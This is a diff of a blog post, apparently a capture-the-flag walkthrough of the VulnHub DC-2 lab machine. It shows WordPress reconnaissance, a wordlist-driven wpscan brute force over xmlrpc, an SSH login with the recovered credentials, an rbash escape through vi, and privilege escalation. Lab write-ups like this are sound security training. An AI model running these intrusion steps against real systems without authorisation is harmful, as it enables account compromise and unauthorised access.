@@ -3,12 +3,12 @@ layout: post
 author: H4
 ---
 
-# PG VULNHUB DC-2
 [Details](https://www.vulnhub.com/entry/dc-2,311/)
-## enumeration
+
+# enumeration
 Performing a simple `nmap` scan to identify the attack surface.
 
-### nmap
+## nmap
 ```bash
 nmap -Pn -p80,7744 -sV  192.168.239.194 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 04:31 EDT
@@ -24,7 +24,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
 ```
 
-### gobuster
+## gobuster
 Using `gobuster` to look for hidden files on the identified web server.
 
 ```bash
@@ -64,13 +64,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ```
 
-It seems that `wordpress` is installed on the web server.  
-`wpscan` reveals that `wordpress` version `4.7.10` is used an outdated.
+> It seems that `wordpress` is installed on the web server. `wpscan` reveals that wordpress version `4.7.10` is used and outdated.
+{: .prompt-tip }
 
 ---
 
-## exploitation
-### wordpress
+# exploitation
+## wordpress
 Looking for exploits against `wordpress 4.7.10`
 
 ```bash
@@ -88,17 +88,19 @@ WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                         
 ---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
-- `WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts ` looks promising  
-- `http://dc-2/?static=1&order=asc` reveals the "secret" content  
+- `WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts` looks promising  
+- `http://dc-2/?static=1&order=asc` reveals the 'secret' content  
   
-Site gives the hint that `cewl` might be a good idea. `cewl` generates custom wordlists it scrapes from the website you provide.  
+> The site gives the hint that `cewl` might be a good idea. `cewl` generates custom wordlists it scrapes from the website you provide.
+{: .prompt-tip }
 
 ```bash
 cewl -d 2 -w ourWordlist.txt "http://dc-2/?static=1&order=asc"
 ```
 
 Then we are using `wpscan` to identify accounts on the `wordpress` site and perform a brute force attack with the generated wordlist.  
-We are using the xmlrpc endpoint here instead of the "normal" login page, because in this way we can perform multiple login attemps with one xml-rpc call.
+> We are using the `xmlrpc` endpoint here instead of the 'normal' login page, because in this way we can perform multiple login attemps with one xml-rpc call.
+{: .prompt-info }
 
 ```bash
 wpscan --url http://dc-2/ --password-attack xmlrpc -P /home/void/Documents/web200/playgrounds/dc2/ourWordlist.txt                                                      
@@ -130,11 +132,13 @@ Trying admin / Powered Time: 00:01:23 <=========================================
 ...
 ```
 Yay! we got two valid credentials for the `wordpress` instance.  
-Unfortunately both accounts cannot be used to upload a `plugin` or escalate to a `rce`.  
+> Unfortunately both accounts cannot be used to upload a `plugin` or escalate to an `rce`.  
+{: .prompt-danger }
 
-### ssh
-- on port 7744 there is a `SSH` service
-- logging in with `tom:parturient` works
+## ssh
+On port 7744 there is a `SSH` service
+> logging in with `tom:parturient` works
+{: .prompt-tip }
 
 ```bash
 ssh tom@dc-2 -p 7744                                                                                                                                                  
@@ -157,10 +161,10 @@ tom@DC-2:~$ cat local.txt
 -rbash: cat: command not found
 ```
 
-`rbash` is in place and the program `cat` cannot be found.  
-`rbash` is a restricted shell which is used to 'jail' a user, so he cannot execute certain commands and act as a normal user.
+> `rbash` is in place and the program `cat` cannot be found. `rbash` is a restricted shell which is used to jail a user, so he cannot execute certain commands and act as a normal user.
+{: .prompt-danger }
 
-### escaping rbash
+## escaping rbash
 ```bash
 tom@DC-2: vi
 :set shell=/bin/bash
@@ -170,13 +174,13 @@ bash: cat: command not found
 ```
 Yay! We escaped `rbash` but cat is still not available.
 
-### cat alternative to get the first flag
+## cat alternative to get the first flag
 ```bash
 tom@DC-2:~$ less local.txt
+9******************************c
 ```
--> `9******************************c`
 
-### privilege escalation
+## privilege escalation
 Try to identify if the user `tom` is able to execute commands as a super user.
 
 ```bash
@@ -213,6 +217,5 @@ final-flag.txt  proof.txt
 # less proof.txt
 6******************************7
 ```
--> `6******************************7`  
   
 Pwned! <@:-)
